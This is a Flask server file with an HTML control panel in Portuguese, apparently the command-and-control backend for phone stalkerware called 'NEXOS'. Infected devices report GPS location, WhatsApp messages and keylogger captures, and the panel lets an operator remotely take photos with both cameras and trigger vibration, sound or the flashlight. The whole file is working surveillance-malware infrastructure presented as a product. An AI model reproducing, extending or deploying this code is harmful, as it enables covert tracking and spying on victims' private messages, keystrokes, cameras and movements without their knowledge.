import os
from flask import Flask, render_template_string, request, jsonify
from datetime import datetime
import logging

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

db_dispositivos = {}

HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NEXOS // PAINEL DE CONTROLE</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <style>
        :root {
            --bg: #0d1117; --bg-card: #161b22; --border: #30363d;
            --text: #c9d1d9; --text-dim: #8b949e; --accent: #58a6ff;
            --green: #3fb950; --orange: #d2991d;
        }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { background: #0d1117; color: var(--text); font-family: 'Segoe UI', 'Courier New', monospace; font-size: 13px; }
        
        .sidebar {
            position: fixed; left: 0; top: 0; bottom: 0; width: 220px; z-index: 999;
            background: #161b22; border-right: 1px solid #30363d;
            display: flex; flex-direction: column; overflow-y: auto;
        }
        .sidebar-logo {
            padding: 15px; font-size: 16px; font-weight: bold; color: #58a6ff;
            border-bottom: 1px solid #30363d; letter-spacing: 2px; text-align: center;
        }
        .sidebar-nav { display: flex; flex-direction: column; padding: 10px 0; }
        .sidebar-nav a {
            color: #8b949e; text-decoration: none; padding: 10px 15px; font-size: 12px;
            border-left: 3px solid transparent; transition: all 0.2s; cursor: pointer;
        }
        .sidebar-nav a:hover, .sidebar-nav a.active {
            color: #c9d1d9; background: #1c2128; border-left-color: #58a6ff;
        }
        
        .main-content { margin-left: 220px; padding: 15px; min-height: 100vh; }
        
        .mobile-topbar {
            display: none; background: #161b22; border-bottom: 1px solid #30363d;
            padding: 10px 15px; align-items: center; justify-content: space-between;
            position: sticky; top: 0; z-index: 100;
        }
        .mobile-topbar .logo { font-size: 14px; font-weight: bold; color: #58a6ff; }
        .mobile-topbar .menu-btn {
            background: #1f6feb; border: none; color: #fff;
            padding: 8px 14px; border-radius: 4px; font-size: 20px; cursor: pointer;
        }
        
        .topbar { padding: 10px 0; border-bottom: 1px solid #30363d; margin-bottom: 15px; }
        .topbar h1 { font-size: 18px; color: #58a6ff; }
        
        .cards-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 15px; }
        
        .card { background: #161b22; border: 1px solid #30363d; border-radius: 8px; overflow: hidden; }
        .card-header { background: #1c2128; padding: 10px 12px; font-size: 11px; font-weight: bold; color: #58a6ff; text-transform: uppercase; border-bottom: 1px solid #30363d; }
        .card-body { padding: 0; }
        
        .cam-frame { width: 100%; aspect-ratio: 4/3; background: #000; display: flex; align-items: center; justify-content: center; }
        .cam-frame img { width: 100%; height: 100%; object-fit: cover; display: none; }
        .cam-placeholder { color: #484f58; font-size: 12px; text-transform: uppercase; }
        
        .map-container { width: 100%; height: 300px; }
        
        .msg-list { padding: 8px; max-height: 250px; overflow-y: auto; }
        .msg-item { display: flex; align-items: center; gap: 8px; padding: 6px 0; border-bottom: 1px solid #21262d; cursor: pointer; }
        .msg-item:hover { background: #1c2128; }
        .msg-avatar { width: 32px; height: 32px; border-radius: 50%; background: #30363d; display: flex; align-items: center; justify-content: center; font-size: 14px; flex-shrink: 0; }
        .msg-info { flex: 1; min-width: 0; }
        .msg-nome { font-size: 12px; font-weight: bold; color: #c9d1d9; }
        .msg-texto { font-size: 11px; color: #8b949e; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
        .msg-detalhe { display: none; padding: 8px 0 0 40px; font-size: 11px; color: #c9d1d9; }
        .msg-item.aberto .msg-detalhe { display: block; }
        
        .status-bar {
            background: #161b22; border: 1px solid #30363d; border-radius: 8px;
            padding: 10px 15px; display: flex; gap: 15px; flex-wrap: wrap;
            font-size: 11px; color: #8b949e; margin-bottom: 15px;
        }
        .status-bar span { color: #c9d1d9; font-weight: bold; }
        .dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; margin-right: 5px; }
        .dot.online { background: #3fb950; box-shadow: 0 0 6px #3fb950; }
        
        .btn-row { display: flex; gap: 8px; margin-bottom: 15px; flex-wrap: wrap; }
        .btn {
            padding: 10px 16px; border-radius: 6px; font-size: 12px; font-weight: bold;
            cursor: pointer; border: none; text-transform: uppercase; letter-spacing: 1px;
            flex: 1; min-width: 60px; transition: all 0.2s; color: #fff;
        }
        .btn:active { transform: scale(0.95); }
        .btn-primary { background: #238636; }
        .btn-accent { background: #1f6feb; }
        .btn-warn { background: #d2991d; color: #000; }
        .btn-maps { background: #1f6feb; text-decoration: none; text-align: center; }
        
        .keylog-bar {
            background: #161b22; border: 1px solid #f85149; padding: 8px 12px;
            border-radius: 6px; font-size: 11px; margin-bottom: 15px;
        }
        .keylog-bar.ativo { border-color: #3fb950; }
        .keylog-bar .app-tag { color: #d2991d; font-weight: bold; text-transform: uppercase; }
        
        .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-bottom: 12px; }
        .info-card { background: #161b22; border: 1px solid #30363d; padding: 12px; border-radius: 6px; text-align: center; }
        .info-card .valor { font-size: 18px; font-weight: bold; color: #c9d1d9; }
        .info-card .label { font-size: 10px; color: #8b949e; text-transform: uppercase; }
        
        .search-box { background: #161b22; border: 1px solid #30363d; padding: 15px; border-radius: 8px; text-align: center; margin-bottom: 15px; }
        .search-box input { width: 100%; max-width: 350px; background: #0d1117; border: 1px solid #30363d; padding: 10px; color: #c9d1d9; text-align: center; border-radius: 6px; font-size: 14px; margin-bottom: 10px; }
        .search-box button { background: #238636; color: #fff; font-weight: bold; border: none; padding: 10px 25px; border-radius: 6px; cursor: pointer; font-size: 12px; text-transform: uppercase; }
        
        .error-box { background: #490202; border: 1px solid #f85149; padding: 12px; border-radius: 6px; text-align: center; margin-bottom: 15px; color: #f85149; }
        
        @media(max-width: 768px) {
            .sidebar { display: none; }
            .sidebar.open { display: flex; position: fixed; z-index: 999; width: 250px; box-shadow: 4px 0 20px rgba(0,0,0,0.5); }
            .main-content { margin-left: 0; }
            .mobile-topbar { display: flex; }
            .cards-grid { grid-template-columns: 1fr; }
            .topbar { display: none; }
            .btn { font-size: 11px; padding: 8px 10px; }
            .status-bar { font-size: 10px; gap: 8px; }
        }
    </style>
</head>
<body>
    <div class="sidebar" id="sidebar">
        <div class="sidebar-logo">⚡ NEXOS CORE</div>
        <nav class="sidebar-nav">
            <a class="active" onclick="fechaMenu()">📊 Painel Geral</a>
            <a onclick="fechaMenu()">📸 Câmeras</a>
            <a onclick="fechaMenu()">📍 Localização GPS</a>
            <a onclick="fechaMenu()">💬 Mensagens</a>
            <a onclick="fechaMenu()">📞 Chamadas</a>
        </nav>
    </div>
    
    <div class="main-content">
        <div class="mobile-topbar">
            <span class="logo">⚡ NEXOS</span>
            <button class="menu-btn" onclick="document.getElementById('sidebar').classList.toggle('open')">☰</button>
        </div>
        
        <div class="topbar"><h1>⚡ NEXOS // PAINEL DE CONTROLE</h1></div>
        
        <div class="search-box">
            <p style="color:#8b949e;margin-bottom:8px;">DIGITE O TARGET ID PARA CONECTAR</p>
            <form method="POST">
                <input type="text" name="target_id" placeholder="EX: NX-A4B7D1" value="{{ id_buscado if id_buscado else '' }}" required><br>
                <button type="submit">Conectar Sinal</button>
            </form>
        </div>
        
        {% if erro %}<div class="error-box"><p>⚠️ {{ erro }}</p></div>{% endif %}
        
        {% if info_moto %}
            <div class="status-bar">
                <span>🟢 ONLINE</span> |
                Ativo: <span id="txt_uptime">{{ info_moto.get('uptime', '--') }}</span> |
                🔋 <span id="txt_bateria">{{ info_moto.battery }}%</span> |
                📶 <span id="txt_network">{{ info_moto.get('network', '--') }}</span> |
                🛣️ <span id="distanciaTotal">0.00</span> km
            </div>
            
            <div class="info-grid">
                <div class="info-card"><div class="label">🔋 Bateria</div><div class="valor" id="info_bateria" style="color:#3fb950;">{{ info_moto.battery }}%</div></div>
                <div class="info-card"><div class="label">🛣️ Distância</div><div class="valor" id="info_distancia" style="color:#58a6ff;">0 km</div></div>
            </div>
            
            <div class="cards-grid">
                <div class="card"><div class="card-header">🎥 Câmera Frontal</div><div class="card-body"><div class="cam-frame"><span id="labelFront" class="cam-placeholder">Sem Sinal</span><img id="imgFront" src="" alt="Frontal"></div></div></div>
                <div class="card"><div class="card-header">🎥 Câmera Traseira</div><div class="card-body"><div class="cam-frame"><span id="labelBack" class="cam-placeholder">Sem Sinal</span><img id="imgBack" src="" alt="Traseira"></div></div></div>
            </div>
            
            <div class="btn-row">
                <button class="btn btn-primary" onclick="capturarFotos()">📸 Capturar</button>
                <button class="btn btn-accent" onclick="comando('vibrar')">📳</button>
                <button class="btn btn-accent" onclick="comando('som')">🔊</button>
                <button class="btn btn-accent" onclick="comando('lanterna')">💡</button>
                <a id="lnk_maps" href="https://www.google.com/maps?q={{ info_moto.lat }},{{ info_moto.lon }}" target="_blank" class="btn btn-maps">🗺️</a>
            </div>
            
            <div class="card" style="margin-bottom:15px;"><div class="card-header">📍 Localização GPS</div><div class="card-body"><div id="map_private" class="map-container"></div></div></div>
            
            <div id="keylogBox" class="keylog-bar"><p>⌨️ Nenhum app monitorado aberto</p></div>
            
            <div class="card" style="margin-bottom:15px;"><div class="card-header">💬 Últimas Mensagens</div><div class="card-body"><div id="chatList" class="msg-list"><p style="color:#484f58;">Nenhuma mensagem recente</p></div></div></div>
            
            <script>
                function fechaMenu() { document.getElementById('sidebar').classList.remove('open'); }
                
                function comando(acao) {
                    fetch('/api/comando_remoto/{{ id_buscado }}', {
                        method: 'POST',
                        body: JSON.stringify({acao: acao}),
                        headers: {'Content-Type': 'application/json'}
                    });
                }
                
                function toggleMsg(id, el) {
                    if(el.classList.contains('aberto')) { el.classList.remove('aberto'); }
                    else { el.classList.add('aberto'); }
                }
                
                function capturarFotos() {
                    var btn = event.target;
                    btn.innerText = "⏳"; btn.disabled = true;
                    fetch('/api/comando_camera/{{ id_buscado }}', {
                        method: 'POST',
                        body: JSON.stringify({acao: 'take_dual'}),
                        headers: {'Content-Type': 'application/json'}
                    });
                    var t = 0;
                    var c = setInterval(function() {
                        fetch('/api/get_camera/{{ id_buscado }}')
                            .then(r => r.json())
                            .then(d => {
                                if(d.photo_back) {
                                    document.getElementById('labelBack').style.display = 'none';
                                    document.getElementById('imgBack').src = 'data:image/jpeg;base64,' + d.photo_back;
                                    document.getElementById('imgBack').style.display = 'block';
                                }
                                if(d.photo_front) {
                                    document.getElementById('labelFront').style.display = 'none';
                                    document.getElementById('imgFront').src = 'data:image/jpeg;base64,' + d.photo_front;
                                    document.getElementById('imgFront').style.display = 'block';
                                }
                                if(d.pronto) {
                                    clearInterval(c);
                                    btn.innerText = "📸 Capturar";
                                    btn.disabled = false;
                                }
                            });
                        t++;
                        if(t > 40) { clearInterval(c); btn.innerText = "📸 Capturar"; btn.disabled = false; }
                    }, 1500);
                }
                
                var map = L.map('map_private', { zoomControl: true }).setView([{{ info_moto.lat }}, {{ info_moto.lon }}], 17);
                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
                var marker = L.marker([{{ info_moto.lat }}, {{ info_moto.lon }}]).addTo(map);
                var historico = L.polyline([], {color: '#58a6ff', weight: 3}).addTo(map);
                var pontos = [[{{ info_moto.lat }}, {{ info_moto.lon }}]];
                
                setInterval(function() {
                    fetch('/api/status/' + '{{ id_buscado }}')
                        .then(r => r.json())
                        .then(d => {
                            document.getElementById('txt_bateria').innerText = d.battery + '%';
                            document.getElementById('info_bateria').innerText = d.battery + '%';
                            document.getElementById('txt_uptime').innerText = d.uptime || '--';
                            document.getElementById('txt_network').innerText = d.network || '--';
                            document.getElementById('distanciaTotal').innerText = (d.distancia_total || 0).toFixed(2);
                            document.getElementById('info_distancia').innerText = (d.distancia_total || 0).toFixed(2) + ' km';
                            
                            var lat = parseFloat(d.lat), lon = parseFloat(d.lon);
                            if (lat && lon) {
                                marker.setLatLng([lat, lon]);
                                map.panTo([lat, lon]);
                                document.getElementById('lnk_maps').href = 'https://www.google.com/maps?q=' + lat + ',' + lon;
                                pontos.push([lat, lon]);
                                historico.setLatLngs(pontos);
                            }
                            
                            var kb = document.getElementById('keylogBox');
                            if (d.keylog && d.keylog.ativo) {
                                kb.className = 'keylog-bar ativo';
                                kb.innerHTML = '<p>⌨️ <span class="app-tag">' + d.keylog.app + '</span> monitorado' + (d.keylog.texto ? ' - ' + d.keylog.texto.substring(0,80) : '') + '</p>';
                            } else {
                                kb.className = 'keylog-bar';
                                kb.innerHTML = '<p>⌨️ Nenhum app monitorado aberto</p>';
                            }
                            
                            if (d.whatsapp && d.whatsapp.length > 0) {
                                var html = '';
                                d.whatsapp.forEach(function(chat) {
                                    html += '<div class="msg-item" onclick="toggleMsg(\'' + chat.pessoa + '\', this)">';
                                    html += '<div class="msg-avatar">👤</div>';
                                    html += '<div class="msg-info">';
                                    html += '<div class="msg-nome">' + chat.pessoa + ' <span style="font-size:10px;color:#8b949e;">(' + chat.total + ')</span></div>';
                                    html += '<div class="msg-texto">' + (chat.midia ? '📎 ' : '') + (chat.ultima_msg || '') + '</div>';
                                    html += '<div class="msg-detalhe">';
                                    if (chat.mensagens) {
                                        chat.mensagens.slice().reverse().forEach(function(msg) {
                                            html += '<div style="padding:3px 0;border-bottom:1px solid #21262d;">📥 ' + msg.texto + ' <span style="color:#484f58;font-size:9px;">' + msg.hora + '</span></div>';
                                        });
                                    }
                                    html += '</div></div></div>';
                                });
                                document.getElementById('chatList').innerHTML = html;
                            }
                        });
                }, 3000);
            </script>
        {% endif %}
    </div>
</body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def index():
    id_buscado = None; info_moto = None; erro = None
    if request.method == 'POST':
        id_buscado = request.form.get('target_id', '').strip().upper()
        if id_buscado in db_dispositivos: info_moto = db_dispositivos[id_buscado]
        else: erro = "ID NAO ENCONTRADO"
    return render_template_string(HTML_DASHBOARD_PRIVADO, id_buscado=id_buscado, info_moto=info_moto, erro=erro)

@app.route('/api/status/<device_id>')
def api_status(device_id):
    device_id = device_id.upper()
    if device_id in db_dispositivos:
        d = db_dispositivos[device_id]
        return jsonify({"battery": d.get("battery","N/A"), "uptime": d.get("uptime","N/A"), "lat": d.get("lat",0), "lon": d.get("lon",0), "network": d.get("network","N/A"), "whatsapp": d.get("whatsapp",[]), "keylog": d.get("keylog"), "distancia_total": d.get("distancia_total", 0)}), 200
    return jsonify({"error": "Not found"}), 404

@app.route('/update', methods=['POST'])
def update():
    data = request.get_json(force=True, silent=True) or {}
    device_id = data.get('device_id', '').upper()
    if not device_id: return jsonify({"status": "error"}), 400
    if device_id not in db_dispositivos: db_dispositivos[device_id] = {}
    db_dispositivos[device_id].update({"battery": data.get("battery","N/A"), "uptime": data.get("uptime","N/A"), "lat": float(data.get("lat",-16.6869)), "lon": float(data.get("lon",-49.2648)), "network": data.get("network","N/A"), "whatsapp": data.get("whatsapp",[]), "keylog": data.get("keylog"), "distancia_total": data.get("distancia_total", 0), "last_seen": datetime.utcnow().isoformat()})
    cmd_cam = db_dispositivos[device_id].get("cmd_cam", "wait")
    cmd_remoto = db_dispositivos[device_id].get("cmd_remoto", "none")
    db_dispositivos[device_id]["cmd_cam"] = "wait"; db_dispositivos[device_id]["cmd_remoto"] = "none"
    return jsonify({"status": "success", "comando_cam": cmd_cam, "comando_remoto": cmd_remoto}), 200

@app.route('/api/comando_camera/<device_id>', methods=['POST'])
def comando_camera(device_id):
    device_id = device_id.upper()
    if device_id not in db_dispositivos: db_dispositivos[device_id] = {}
    db_dispositivos[device_id]["cmd_cam"] = "take_dual"
    db_dispositivos[device_id]["photo_front"] = ""; db_dispositivos[device_id]["photo_back"] = ""
    return jsonify({"status": "ok"}), 200

@app.route('/api/comando_remoto/<device_id>', methods=['POST'])
def comando_remoto(device_id):
    device_id = device_id.upper()
    if device_id not in db_dispositivos: db_dispositivos[device_id] = {}
    db_dispositivos[device_id]["cmd_remoto"] = (request.get_json(force=True, silent=True) or {}).get("acao", "none")
    return jsonify({"status": "ok"}), 200

@app.route('/api/upload_lote', methods=['POST'])
def upload_lote():
    data = request.get_json(force=True, silent=True) or {}
    dev_id = data.get("device_id", '').upper()
    if dev_id and dev_id in db_dispositivos:
        if data.get("photo_front"): db_dispositivos[dev_id]["photo_front"] = data["photo_front"]
        if data.get("photo_back"): db_dispositivos[dev_id]["photo_back"] = data["photo_back"]
        return jsonify({"status": "stored"}), 200
    return jsonify({"status": "error"}), 404

@app.route('/api/get_camera/<device_id>')
def get_camera(device_id):
    device_id = device_id.upper()
    if device_id in db_dispositivos:
        pf = db_dispositivos[device_id].get("photo_front", ""); pb = db_dispositivos[device_id].get("photo_back", "")
        return jsonify({"photo_front": pf, "photo_back": pb, "pronto": bool(pf and pb)}), 200
    return jsonify({"photo_front": "", "photo_back": "", "pronto": False}), 404

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)), debug=False)
